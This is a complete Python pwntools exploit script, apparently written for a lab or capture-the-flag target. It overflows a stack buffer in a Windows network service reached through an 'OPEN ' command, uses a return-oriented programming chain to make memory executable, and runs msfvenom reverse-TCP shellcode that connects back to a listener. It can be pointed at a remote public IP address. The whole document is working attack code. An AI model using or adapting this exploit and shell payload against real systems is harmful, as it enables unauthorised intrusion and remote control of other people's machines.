from pwn import *

push_esp_xor_dwordptr_ebx_eax_add_dwordptr_edi_0x5e_ebx_pop_ebx_pop_ebp = 0x0102594d  # push esp ; xor dword ptr [ebx], eax ; add dword ptr [edi + 0x5e], ebx ; pop ebx ; pop ebp ; ret

mov_eax_ebx_pop_ebx                 = 0x01012c2f  # mov eax, ebx ; pop ebx ; ret
mov_eax_dwordptr_ecx                = 0x01018ffb  # mov eax, dword ptr [ecx] ; ret
mov_eax_dwordptr_ebp_minus_0x1c     = 0x0101d166  # mov eax, dword ptr [ebp - 0x1c] ; ret
mov_eax_dwordptr_ebp_plus_8 = 0x01017be7 #: mov eax, dword ptr [ebp + 8] ; pop ebp ; ret
mov_dwordptr_ecx_plus_8_eax         = 0x0101befc  # mov dword ptr [ecx + 8], eax ; ret

xchg_ecx_eax                        = 0x0102c544  # xchg ecx, eax ; ret   (listed twice in input)
xchg_edi_eax                        = 0x0102da72  # xchg edi, eax ; ret
xchg_ebp_eax = 0x01013990 # : xchg ebp, eax ; ret
mov_esp_ebp_pop_ebp = 0x01011184 # : mov esp, ebp ; pop ebp ; ret
mov_dwordptr_edx_eax_mov_eax_3      = 0x01012abe  # mov dword ptr [edx], eax ; mov eax, 3 ; ret

neg_eax_pop_ebp                     = 0x0102240b  # neg eax ; pop ebp ; ret
inc_ecx                             = 0x01026026  # inc ecx ; ret

pop_eax_pop_ebp                     = 0x01017157  # pop eax ; pop ebp ; ret
pop_ebx                             = 0x01011fd2  # pop ebx ; ret
pop_edi                             = 0x01013365  # pop edi ; ret
pop_ebp                             = 0x0101100f  # pop ebp ; ret
pop_edx = 0x0102c6ce #: pop edx ; ret

add_ecx_esp                         = 0x0102c553  # add ecx, esp ; ret
xor_eax_eax                         = 0x010118db  # xor eax, eax ; ret
sub_eax_ecx                         = 0x0101484a  # sub eax, ecx ; ret
sub_eax_edx_pop2 = 0x0102069b #: sub eax, edx ; pop esi ; pop ebp ; ret
add_eax_ecx_pop2 = 0x01012963 #  : add eax, ecx ; pop esi ; pop ebp ; ret
add_ebx_eax = 0x0102c54f #: add ebx, eax ; ret

mov_eax_ecx = 0x01011c2b#: mov eax, ecx ; ret
mov_eax_ebx_pop1 = 0x01012c2f#: mov eax, ebx ; pop ebx ; ret

table_virtualp = 0x0102F0F0	
junk = 0x41414141
neg_48 = 2**32 - 36 #- 4 
neg_500  = 2**32 - 0x110 - 32
first_value = 0x82828282 # first value to be added
second_value1 = (2**32+0x1000) - 0x82828282 # second value to be added 0x1000
second_value2 = (2**32+0x40) - 0x82828282 # second value to be added 0x40
bss = 0x010387cc

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.3 LPORT=4242 EXITFUNC=thread â€“e x86/shikata_ga_nai -f python -b b"\x00\x09\x0a\x0b\x0c\x0d\x20" -v shellcode
shellcode =  b""
shellcode += b"\xba\x7f\xe1\xbe\xec\xdb\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04"
shellcode += b"\x03\x29\xef\x5c\x19\x29\x07\x22\xe2\xd1\xd8"
shellcode += b"\x43\x6a\x34\xe9\x43\x08\x3d\x5a\x74\x5a\x13"
shellcode += b"\x57\xff\x0e\x87\xec\x8d\x86\xa8\x45\x3b\xf1"
shellcode += b"\x87\x56\x10\xc1\x86\xd4\x6b\x16\x68\xe4\xa3"
shellcode += b"\x6b\x69\x21\xd9\x86\x3b\xfa\x95\x35\xab\x8f"
shellcode += b"\xe0\x85\x40\xc3\xe5\x8d\xb5\x94\x04\xbf\x68"
shellcode += b"\xae\x5e\x1f\x8b\x63\xeb\x16\x93\x60\xd6\xe1"
shellcode += b"\x28\x52\xac\xf3\xf8\xaa\x4d\x5f\xc5\x02\xbc"
shellcode += b"\xa1\x02\xa4\x5f\xd4\x7a\xd6\xe2\xef\xb9\xa4"
shellcode += b"\x38\x65\x59\x0e\xca\xdd\x85\xae\x1f\xbb\x4e"
shellcode += b"\xbc\xd4\xcf\x08\xa1\xeb\x1c\x23\xdd\x60\xa3"
shellcode += b"\xe3\x57\x32\x80\x27\x33\xe0\xa9\x7e\x99\x47"
shellcode += b"\xd5\x60\x42\x37\x73\xeb\x6f\x2c\x0e\xb6\xe7"
shellcode += b"\x81\x23\x48\xf8\x8d\x34\x3b\xca\x12\xef\xd3"
shellcode += b"\x66\xda\x29\x24\x88\xf1\x8e\xba\x77\xfa\xee"
shellcode += b"\x93\xb3\xae\xbe\x8b\x12\xcf\x54\x4b\x9a\x1a"
shellcode += b"\xfa\x1b\x34\xf5\xbb\xcb\xf4\xa5\x53\x01\xfb"
shellcode += b"\x9a\x44\x2a\xd1\xb2\xef\xd1\xb2\x7c\x47\xe1"
shellcode += b"\x41\x15\x9a\x11\x56\x77\x13\xf7\x3c\x67\x72"
shellcode += b"\xa0\xa8\x1e\xdf\x3a\x48\xde\xf5\x47\x4a\x54"
shellcode += b"\xfa\xb8\x05\x9d\x77\xaa\xf2\x6d\xc2\x90\x55"
shellcode += b"\x71\xf8\xbc\x3a\xe0\x67\x3c\x34\x19\x30\x6b"
shellcode += b"\x11\xef\x49\xf9\x8f\x56\xe0\x1f\x52\x0e\xcb"
shellcode += b"\x9b\x89\xf3\xd2\x22\x5f\x4f\xf1\x34\x99\x50"
shellcode += b"\xbd\x60\x75\x07\x6b\xde\x33\xf1\xdd\x88\xed"
shellcode += b"\xae\xb7\x5c\x6b\x9d\x07\x1a\x74\xc8\xf1\xc2"
shellcode += b"\xc5\xa5\x47\xfd\xea\x21\x40\x86\x16\xd2\xaf"
shellcode += b"\x5d\x93\xf2\x4d\x77\xee\x9a\xcb\x12\x53\xc7"
shellcode += b"\xeb\xc9\x90\xfe\x6f\xfb\x68\x05\x6f\x8e\x6d"
shellcode += b"\x41\x37\x63\x1c\xda\xd2\x83\xb3\xdb\xf6"


badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

if args.REMOTE:
    io = connect('54.169.198.218', 8433)
else:
    # io = connect('192.168.56.4', 8433)
    io = connect('192.168.56.4', 11102)
# 
badchar = b'\x00\x09\x0a\x0b\x0c\x0d\x20'
p = b'OPEN '
p += b'A'*(268-4*6)
p += p32(0x41414141)                   
p += p32(0x41414141)                # ret
p += p32(0x41414141)           # dummy lpBuffer (Stack address)
p += p32(0x43434343)                #  dummy nSize
p += p32(0x44444444)                # permission
p += p32(bss)           
# p += badchars
p += p32(xor_eax_eax)  
p += p32(xchg_ecx_eax)  
p += p32(add_ecx_esp)  
p += p32(pop_eax_pop_ebp) 
p += p32(neg_48-8)
p += p32(junk)
p += p32(add_eax_ecx_pop2)  
p += p32(junk)
p += p32(junk)
p += p32(xchg_ecx_eax) 
p += p32(pop_ebp) 
p += p32(table_virtualp-8)  
p += p32(mov_eax_dwordptr_ebp_plus_8) 
p += p32(junk)
p += p32(mov_dwordptr_ecx_plus_8_eax)

p += p32(inc_ecx) * 4
p += p32(mov_eax_ecx)
p += p32(pop_edx)
p += p32(neg_500)
p += p32(0x0102069b)  # 0x0102069b : sub eax, edx ; pop esi ; pop ebp ; ret
p += p32(junk)
p += p32(junk)

p += p32(mov_dwordptr_ecx_plus_8_eax)

p += p32(inc_ecx) * 4
p += p32(mov_dwordptr_ecx_plus_8_eax)

p += p32(inc_ecx) * 4
p += p32(pop_eax_pop_ebp) 
p += p32(first_value)
p += p32(junk)
p += p32(pop_ebx)
p += p32(second_value1) 
p += p32(add_ebx_eax)
p += p32(mov_eax_ebx_pop1)
p += p32(junk)
p += p32(mov_dwordptr_ecx_plus_8_eax)

p += p32(inc_ecx) * 4
p += p32(pop_eax_pop_ebp) 
p += p32(first_value)
p += p32(junk)
p += p32(pop_ebx)
p += p32(second_value2) 
p += p32(add_ebx_eax)
p += p32(mov_eax_ebx_pop1)
p += p32(junk)
p += p32(mov_dwordptr_ecx_plus_8_eax)

p += p32(xor_eax_eax) 
p += p32(pop_eax_pop_ebp)
p += p32(2**32 - 8-4)  # neg 0x1000
p += p32(junk)
p += p32(add_eax_ecx_pop2)  
p += p32(junk)
p += p32(junk)
p += p32(xchg_ebp_eax)
p += p32(mov_esp_ebp_pop_ebp)
p += b'\x90' * 0x30  # NOP sled
p += shellcode
# p += p32(0x0101d9e2) #add ecx, ecx ; ret)
for i in badchar:
    if i in p[5:]:
        print(f'Bad character found: {hex(i)}')
        exit(1)
'''
bp 0x01013990
'''

p += b'C'*4
p += b'D'*4

# p = b'OPEN '
# p += b'A'*(0x400)

io.send(p)

io.interactive()
